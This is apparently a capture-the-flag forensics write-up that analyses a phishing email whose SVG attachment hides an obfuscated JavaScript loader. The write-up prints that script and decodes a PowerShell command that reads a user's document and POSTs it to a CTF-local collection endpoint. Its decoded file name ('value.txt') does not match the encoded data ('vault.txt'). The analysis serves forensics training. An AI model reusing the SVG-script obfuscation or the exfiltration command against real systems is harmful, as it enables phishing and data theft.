# Dead Drop - GCTF 2026

Solved by `adrianchx`

## Introduction

Dead Drop is a forensics challenge built around a preserved phishing email. We're given a `incident.eml` file, the raw, unmodified email as it would have traveled across mail servers and asked to follow the "digital breadcrumbs" to identify the payload and the document it was trying to steal.

The challenge description frames it as: a forged corporate security notice was delivered to a finance employee, suspicious outbound traffic followed, and investigators preserved the original email. The task is to uncover what the payload was really after and identify the document tied to the attempted heist.

Flag format: `gctf26{document_id}`

## What's an `.eml` file?

An `.eml` file is a **raw email message saved as a single text file**, in the exact format mail servers use to move messages around (RFC 5322 / MIME). It's a snapshot of the whole email: headers, body, and attachments all serialized as text, the way it exists "on the wire" before any mail client prettifies it.

Every `.eml` has:

- **Headers**: `From`, `To`, `Subject`, `Date`, `Message-ID`, `Received` (server hops), authentication results.
- **A blank line**, then the **body**.
- **MIME structure**: if there's an attachment, the body becomes a `multipart/mixed` container with a `boundary=...` separator, and each part is its own MIME section.
- **Encodings**: binary data is usually base64 or quoted-printable, because email has to stay 7-bit ASCII-safe.

For forensics, the `.eml` is a time capsule: sender infrastructure, the payload, URLs, timestamps, and social engineering clues are all preserved.

## The Solve

Opening the `.eml` in VS Code, we can easily see the whole thing at once. The top is the header block:

```text
Content-Type: multipart/mixed; boundary="===============8789010102227513322=="
MIME-Version: 1.0
From: Information Security <security-notice@gctf.local>
To: Nadia Rahman <nadia.rahman@gctf.local>
Subject: ACTION REQUIRED: Updated Corporate Security Policy
Date: Tue, 15 Sep 2026 09:42:18 +0800
Message-ID: <20260915094218.4817.security@gctf.local>
X-Mailer: GCTF Corporate Mail Gateway
X-Priority: 1
```

The content type is `multipart/mixed`, so there are attachments. Scanning down, we see two MIME parts separated by the boundary:

1. A `text/plain` part (the email body), base64-encoded.
2. An `application/svg+xml` part called `SecurityNotice.svg`, also base64-encoded.

That SVG is the interesting one. SVGs are XML, and XML can carry `<script>` tags.

Extracting the plain text part and running it through Base64 decode in CyberChef gives us the email body.

Encoded plain text:

```base64
RGVhciBOYWRpYSwKClRoZSBJbmZvcm1hdGlvbiBTZWN1cml0eSBEZXBhcnRtZW50IGhhcyBwdWJs
aXNoZWQgYW4gdXBkYXRlZAp3b3Jrc3RhdGlvbiBzZWN1cml0eSBwb2xpY3kuCgpBbGwgRmluYW5j
ZSBwZXJzb25uZWwgYXJlIHJlcXVpcmVkIHRvIHJldmlldyB0aGUgYXR0YWNoZWQgc2VjdXJpdHkK
bm90aWNlIGJlZm9yZSB0aGUgZW5kIG9mIHRoZSBidXNpbmVzcyBkYXkuCgpQbGVhc2Ugb3BlbiBT
ZWN1cml0eU5vdGljZS5zdmcgdG8gcmV2aWV3IHRoZSB1cGRhdGVkIGFkdmlzb3J5LgoKUmVnYXJk
cywKCkluZm9ybWF0aW9uIFNlY3VyaXR5IERlcGFydG1lbnQKR0NURiBDb3Jwb3JhdGlvbgoKLS0t
ClRoaXMgbWVzc2FnZSB3YXMgYXV0b21hdGljYWxseSBnZW5lcmF0ZWQuCg==
```

Decoded:

```text
Dear Nadia,

The Information Security Department has published an updated
workstation security policy.

All Finance personnel are required to review the attached security
notice before the end of the business day.

Please open SecurityNotice.svg to review the updated advisory.

Regards,

Information Security Department
GCTF Corporation

---
This message was automatically generated.
```

One thing to note here is `SecurityNotice.svg` which is our next target here.

Extracting the second MIME part and Base64-decoding it gives us the SVG file. The SVG is mostly a rendered "notice" graphic with rectangles and text, but near the end of the body, there's an embedded `<script type="text/javascript"><![CDATA[ ... ]]></script>` block.

Here's the full `<script></script>` section:

```xml
<script type="text/javascript"><![CDATA[

/*
 * Security notice helper.
 * Internal build 4.7.2
 */

const endpointParts = ["aHR0cHM","6Ly91cGRh","dGVzLm","djdGYubG9jY","WwvYXBp","L2NvbGxlY","3Q="];

const taskParts = ["JABwAGEAdABoA","CAAPQAgA","CIAJABlAG4AdgA6AF","UAUwBFAFIA","UABSAE8ARgBJA","EwARQBcA","EQAbwBjAHUAbQBlAG","4AdABzAFwA","dgBhAHUAbAB0A","C4AdAB4A","HQAIgA7AAoAJABkAG","EAdABhACAA","PQAgAEcAZQB0A","C0AQwBvA","G4AdABlAG4AdAAgAC","QAcABhAHQA","aAAgAC0AUgBhA","HcAOwAKA","EkAbgB2AG8AawBlAC","0AVwBlAGIA","UgBlAHEAdQBlA","HMAdAAgA","C0AVQByAGkAIAAiAG","gAdAB0AHAA","cwA6AC8ALwB1A","HAAZABhA","HQAZQBzAC4AZwBjAH","QAZgAuAGwA","bwBjAGEAbAAvA","GEAcABpA","C8AYwBvAGwAbABlAG","MAdAAiACAA","LQBNAGUAdABoA","G8AZAAgA","FAATwBTAFQAIAAtAE","IAbwBkAHkA","IAAkAGQAYQB0A","GEAOwAKA","A=="];

const profileParts = ["580140424e53424","a444d011901474642470e","4f46575746510","10f0157425144465701","1901454a4d424d4","046010f01404c4f4f4640","574a4c4d7c4e4","6574b4c47011901454a","4f460e514642470","10f01504c565140467c45","4a4f460119015","542564f570d575b5701","0f01474c40564e4","64d577c4a470119016e17","126f7c7771176","0107c146b107c73177a","6f131767010f014","64d47534c4a4d57011901","0c42534a0c404","c4f4f464057015e"];


/*
 * Decode communication endpoint.
 */
function resolveEndpoint() {
    const encoded = endpointParts.join("");
    return atob(encoded);
}


/*
 * PowerShell task is stored using the same representation
 * as PowerShell.exe -EncodedCommand.
 */
function resolveTask() {
    return taskParts.join("");
}


/*
 * Local configuration protection.
 */
function recoverProfile() {

    const raw = profileParts.join("");

    const key = 0x23;

    let output = "";

    for (let i = 0; i < raw.length; i += 2) {

        const value = parseInt(
            raw.substr(i, 2),
            16
        );

        output += String.fromCharCode(
            value ^ key
        );
    }

    return output;
}


const endpoint = resolveEndpoint();

const executionTask = resolveTask();

const profile = recoverProfile();


/*
 * Diagnostic values used by the original loader.
 */
console.log(endpoint);
console.log(executionTask);
console.log(profile);

]]></script>
```

The malware is telling us exactly how to deobfuscate each string — it has to, because it needs these functions to run at runtime. So we can just reverse each transform by hand.

First,

```js
const endpointParts = ["aHR0cHM","6Ly91cGRh","dGVzLm","djdGYubG9jY","WwvYXBp","L2NvbGxlY","3Q="];
```

**the endpoint.** Joining `endpointParts` and Base64-decoding the result gives:

```js
https://updates.gctf.local/api/collect
```

That's the C2 endpoint the payload would POST to.

Next,

```js
const taskParts = ["JABwAGEAdABoA","CAAPQAgA","CIAJABlAG4AdgA6AF","UAUwBFAFIA","UABSAE8ARgBJA","EwARQBcA","EQAbwBjAHUAbQBlAG","4AdABzAFwA","dgBhAHUAbAB0A","C4AdAB4A","HQAIgA7AAoAJABkAG","EAdABhACAA","PQAgAEcAZQB0A","C0AQwBvA","G4AdABlAG4AdAAgAC","QAcABhAHQA","aAAgAC0AUgBhA","HcAOwAKA","EkAbgB2AG8AawBlAC","0AVwBlAGIA","UgBlAHEAdQBlA","HMAdAAgA","C0AVQByAGkAIAAiAG","gAdAB0AHAA","cwA6AC8ALwB1A","HAAZABhA","HQAZQBzAC4AZwBjAH","QAZgAuAGwA","bwBjAGEAbAAvA","GEAcABpA","C8AYwBvAGwAbABlAG","MAdAAiACAA","LQBNAGUAdABoA","G8AZAAgA","FAATwBTAFQAIAAtAE","IAbwBkAHkA","IAAkAGQAYQB0A","GEAOwAKA","A=="];
```

**the task.** Joining `taskParts` gives a base64 string. The comment above the function says it's stored the same way PowerShell's `-EncodedCommand` is, which is base64 of UTF-16LE text. Decoding it gives:

```powershell
$path = "$env:USERPROFILE\Documents\value.txt";
$data = Get-Content $path -Raw;
Invoke-WebRequest -Uri "https://updates.gctf.local/api/collect" -Method POST -Body $data
```

So the payload reads the victim's `Documents\value.txt` and posts it to the C2. That's the exfiltration step.

Last,

```js
const profileParts = ["580140424e53424","a444d011901474642470e","4f46575746510","10f0157425144465701","1901454a4d424d4","046010f01404c4f4f4640","574a4c4d7c4e4","6574b4c47011901454a","4f460e514642470","10f01504c565140467c45","4a4f460119015","542564f570d575b5701","0f01474c40564e4","64d577c4a470119016e17","126f7c7771176","0107c146b107c73177a","6f131767010f014","64d47534c4a4d57011901","0c42534a0c404","c4f4f464057015e"];
```

**the profile.** This one is hex-then-XOR. We know this thanks to the `recoverProfile()` function which reads two hex characters at a time, converts them to a byte, and XORs with `0x23`. Doing this in CyberChef with **From Hex** followed by **XOR 0x23** on the joined `profileParts` string gives us a JSON object:

```json
{
  "campaign": "dead-letter",
  "target": "finance",
  "collection_method": "file-read",
  "source_file": "vault.txt",
  "document_id": "M41L_TR4C3_7H3_P4YL04D",
  "endpoint": "/api/collect"
}
```

The `document_id` field is what we need. Thus:

`gctf26{M41L_TR4C3_7H3_P4YL04D}`
